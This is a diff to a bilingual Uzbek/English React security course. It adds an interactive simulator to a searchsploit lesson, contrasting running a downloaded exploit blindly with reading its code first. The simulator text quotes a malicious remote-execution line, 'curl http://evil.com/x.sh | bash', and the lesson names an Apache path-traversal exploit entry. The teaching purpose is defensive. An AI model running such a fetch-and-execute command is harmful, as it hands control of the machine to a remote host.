@@ -1148,6 +1148,46 @@ function PayloadHandlerSim(){
       React.createElement("button",{onClick:()=>{setRun("match");setStep(-1);},style:{flex:1,padding:"9px",background:run==="match"?A+"22":SL2,color:run==="match"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Aniq mos payload","✅ Exact-match payload"))));
 }
 
+function ExploitVerifySim(){
+  const lang=useLang();
+  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
+  const BLIND=[
+    {col:BL,uz:"searchsploit -m 50383 — exploit joriy papkaga nusxalanadi",en:"searchsploit -m 50383 — the exploit is copied to the current folder",duz:"Kod hali bir marta ham o'qilmagan.",den:"The code hasn't been read even once yet."},
+    {col:AM,uz:"python3 50383.py <target> — kodni o'qimasdan darhol ishga tushiriladi",en:"python3 50383.py <target> — run immediately without reading it",duz:"«Nomiga qarab ishonish» — xavfli odat.",den:"«Trusting it by name alone» is a dangerous habit."},
+    {col:AM,uz:"Skript fonda /tmp/.hidden/backdoor.sh yuklab, ishga tushiradi",en:"In the background, the script downloads and runs /tmp/.hidden/backdoor.sh",duz:"Bu — asl zaiflikka hech qanday aloqasi bo'lmagan qo'shimcha kod.",den:"This is extra code with no relation to the real vulnerability at all."},
+    {col:D,uz:"☠ «Exploit» sizning Kali'ingizni zararladi — hujumchi qurbon bo'ldi",en:"☠ The «exploit» infected your own Kali — the attacker became the victim",duz:"Exploit-DB'da har narsa tekshirilgan emas — noma'lum yuklamalar xavfli.",den:"Not everything on Exploit-DB is vetted — unverified downloads are risky.",final:true,bad:true}
+  ];
+  const VERIFIED=[
+    {col:BL,uz:"searchsploit -x 50383.py — kod terminalda ochiladi, o'qish uchun",en:"searchsploit -x 50383.py — the code opens in the terminal for reading",duz:"Hech narsa ishga tushirilmadi — faqat o'qildi.",den:"Nothing was executed yet — only read."},
+    {col:AM,uz:"Kod ichida kutilmagan tarmoq so'rovi topiladi: curl http://evil.com/x.sh | bash",en:"An unexpected network call is spotted inside the code: curl http://evil.com/x.sh | bash",duz:"Bu qator zaiflikni ekspluatatsiya qilish bilan hech qanday aloqasi yo'q.",den:"This line has nothing to do with exploiting the actual vulnerability."},
+    {col:AM,uz:"Bu — asl zaiflik bilan bog'liq emas, alohida zararli qo'shimcha",en:"This is unrelated to the real vulnerability — a separate malicious add-on",duz:"Haqiqiy exploit kodi ancha soddaroq bo'lishi kerak edi.",den:"The genuine exploit code should have looked much simpler."},
+    {col:A,uz:"🔍 O'qib chiqish tuzoqni fosh qildi — kod ishlatilmadi",en:"🔍 Reading it first exposed the trap — the code was never run",duz:"Ishga tushirishdan oldingi bir daqiqalik tekshiruv katta zarardan saqladi.",den:"One extra minute of review before running saved from serious harm.",final:true}
+  ];
+  const [run,setRun]=useState(null);
+  const [step,setStep]=useState(-1);
+  useEffect(()=>{
+    if(run==null){setStep(-1);return;}
+    const list=run==="blind"?BLIND:VERIFIED;
+    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
+    if(step>=list.length-1) return;
+    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
+  },[run,step]);
+  const list=run==="blind"?BLIND:run==="verified"?VERIFIED:null;
+  const cur=list&&step>=0?list[step]:null;
+  return React.createElement("div",{style:{margin:"14px 0"}},
+    React.createElement("div",{style:{minHeight:50}},
+      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — bitta shubhali exploit'ni ko'r-ko'rona ishga tushirish va avval o'qishni solishtiring.","⬇ Pick a scenario — compare running a suspicious exploit blindly versus reading it first.")):
+      list.map(function(s,i){ if(step<i) return null;
+        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
+          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
+          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
+    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
+      run==="blind"?t(lang,"✗ Ko'r-ko'rona: hujumchi o'zi qurbon bo'ldi","✗ Blindly: the attacker became the victim"):t(lang,"✓ Avval o'qish: tuzoq ishlatilishdan oldin fosh bo'ldi","✓ Reading first: the trap was exposed before it could run")),
+    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
+      React.createElement("button",{onClick:()=>{setRun("blind");setStep(-1);},style:{flex:1,padding:"9px",background:run==="blind"?D+"22":SL2,color:run==="blind"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ Ko'r-ko'rona ishga tushirish","☠ Run it blindly")),
+      React.createElement("button",{onClick:()=>{setRun("verified");setStep(-1);},style:{flex:1,padding:"9px",background:run==="verified"?A+"22":SL2,color:run==="verified"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔍 Avval o'qib chiqish","🔍 Read it first"))));
+}
+
 function LessonL01(){
   const lang=useLang();
   return React.createElement("section",null,
@@ -2357,9 +2397,12 @@ function LessonL23(){
     React.createElement(P,null,t(lang,"-x bayrog'i ekspluatatsiya kodini to'g'ridan-to'g'ri terminalda ochadi (nima qilishini o'qish uchun). -m esa uni joriy katalogga nusxalaydi, keyin sozlab ishga tushirasiz. searchsploit'ning eng katta afzalligi — u OFLAYN ishlaydi: butun Exploit-DB sizning Kali'ingizda mahalliy saqlanadi, shuning uchun internetsiz muhitda ham (masalan izolyatsiya qilingan nishon tarmog'ida) ishlatasiz. searchsploit -u bilan uni yangilab turing.","The -x flag opens the exploit code directly in the terminal (to read what it does). -m copies it to the current directory, then you tune and run it. searchsploit's biggest advantage is that it works OFFLINE: the whole Exploit-DB is stored locally in your Kali, so you can use it even without internet (e.g. inside an isolated target network). Keep it updated with searchsploit -u.")),
     React.createElement(Terminal,null,"searchsploit apache 2.4\nsearchsploit -t wordpress\nsearchsploit -x php/webapps/50123.php   # kodni o'qish\nsearchsploit -m 50123                    # nusxalash\nsearchsploit -u                          # bazani yangilash"),
     React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Internetdan olingan ekspluatatsiya kodini ko'r-ko'rona ishga tushirmang — avval uni o'qib, nima qilishini tushuning. Ba'zi «ekspluatatsiyalar» aslida sizning mashinangizga qarshi zararli kod bo'lishi mumkin.","Never blindly run exploit code from the internet — read it first and understand what it does. Some «exploits» are actually malicious code aimed at your own machine.")),
-    React.createElement(H2,{num:"§5"},t(lang,"searchsploit parametrlari","searchsploit options")),
+    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: ko'r-ko'rona ishga tushirish vs avval o'qish","Interactive simulator: running blindly vs reading first")),
+    React.createElement(P,null,t(lang,"InfoBox'dagi ogohlantirishni his qiling — bitta shubhali «exploit» faylini ikki xil yondashuv bilan sinang:","Feel the InfoBox warning for yourself — try one suspicious «exploit» file two different ways:")),
+    React.createElement(ExploitVerifySim),
+    React.createElement(H2,{num:"§6"},t(lang,"searchsploit parametrlari","searchsploit options")),
     React.createElement(LayerStack,{layers:[{n:"-t",name:t(lang,"-t","-t"),color:"#4dabf7",desc:{uz:"Faqat sarlavha bo'yicha qidiradi (aniqroq).",en:"Search by title only (more precise)."}},{n:"-m",name:t(lang,"-m","-m"),color:"#69db7c",desc:{uz:"Ekspluatatsiyani joriy papkaga nusxalaydi.",en:"Copies the exploit to the current folder."}},{n:"-x",name:t(lang,"-x","-x"),color:"#a855f7",desc:{uz:"Ekspluatatsiya kodini ko'rsatadi.",en:"Displays the exploit code."}},{n:"-p",name:t(lang,"-p","-p"),color:"#ffd43b",desc:{uz:"To'liq yo'l va URL beradi.",en:"Gives the full path and URL."}},]}),
-    React.createElement(H2,{num:"§6"},t(lang,"Amaliyot: ekspluatatsiya qidirish","Practice: finding an exploit")),
+    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: ekspluatatsiya qidirish","Practice: finding an exploit")),
     React.createElement(P,null,t(lang,"Nishon versiyasini aniqlagach (nmap -sV), searchsploit unga mos tayyor ekspluatatsiyani oflayn topadi. Har doim versiyani aniq ko'rsating.","After identifying the target version (nmap -sV), searchsploit finds a matching ready exploit offline. Always specify the version precisely.")),
     React.createElement(Terminal,null,"searchsploit apache 2.4.49\n# ------------------------------------- -------------\n#  Exploit Title                        |  Path\n# ------------------------------------- -------------\n#  Apache 2.4.49 - Path Traversal & RCE | multiple/webapps/50383.sh\nsearchsploit -m 50383   # nusxalab olish"),
     React.createElement(Quiz,{q:{uz:"searchsploit asosan nima uchun ishlatiladi?",en:"What is searchsploit mainly used for?"},opts:[{uz:"Portlarni skanerlash",en:"Scanning ports"},{uz:"Ma'lum dastur/versiyaga tayyor ekspluatatsiyalarni topish",en:"Finding ready exploits for a known software/version"},{uz:"Parollarni buzish",en:"Cracking passwords"},{uz:"Trafikni tinglash",en:"Sniffing traffic"}],correct:1,exp:{uz:"searchsploit Exploit-DB ning lokal nusxasidan ma'lum dastur va versiyaga mos ekspluatatsiyalarni OFLAYN qidiradi.",en:"searchsploit searches a local copy of Exploit-DB OFFLINE for exploits matching a known software and version."}}));
